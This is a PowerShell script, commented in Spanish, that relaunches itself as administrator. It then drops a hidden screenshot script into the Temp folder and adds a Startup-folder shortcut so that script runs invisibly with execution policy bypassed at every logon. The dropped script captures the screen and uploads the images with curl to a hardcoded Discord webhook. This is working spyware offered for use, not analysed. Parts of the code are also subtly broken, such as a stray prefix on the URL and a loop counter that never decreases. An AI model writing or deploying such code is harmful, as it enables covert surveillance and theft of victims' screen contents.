# Verificar si se está ejecutando como administrador
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

# Si no se está ejecutando como administrador, volver a ejecutar como administrador
if (-not $isAdmin) {
    Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file "{0}"' -f $MyInvocation.MyCommand.Path)
    exit
}

# Ruta del script de captura de pantalla
$ScriptPath = "$env:USERPROFILE\Documents\.\." + [char]92 + "AppData" + [char]92 + "Local" + [char]92 + "Temp" + [char]92 + "screenshot_script.ps1"

# Contenido del script de captura de pantalla
$ScriptContent = @"
\$hookurl = "Uhttps://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
\$seconds = 30 # Intervalo de captura de pantalla
\$a = 2 # Cantidad de capturas de pantalla

# Detección de URL acortada
if (\$hookurl.Ln -ne 121) {
    Write-Host "¡Se detectó una URL de webhook acortada!"
    \$hookurl = (irm \$hookurl).url
}

While (\$a -gt 0) {
    \$Filett = "\$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    \$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    \$Width = \$Screen.Width
    \$Height = \$Screen.Height
    \$Left = \$Screen.Left
    \$Top = \$Screen.Top
    \$bitmap = New-Object System.Drawing.Bitmap \$Width, \$Height
    \$graphic = [System.Drawing.Graphics]::FromImage(\$bitmap)
    \$graphic.CopyFromScreen(\$Left, \$Top, 0, 0, \$bitmap.Size)
    \$bitmap.Save(\$Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    curl.exe -F "file1=@\$Filett" \$hookurl
    Start-Sleep 1
    Remove-Item -Path \$Filett
    Start-Sleep \$seconds
    \$a
}
"@

# Guardar el script de captura de pantalla en la ruta especificada
$ScriptContent | Out-File -FilePath $ScriptPath -Encoding utf8

# Ruta del acceso directo en la carpeta de inicio de Windows
$ShortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\screenshot_script.lnk"

# Crear acceso directo para ejecutar el script de captura de pantalla al iniciar sesión
$Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$ScriptPath"""
$Shortcut.Save()
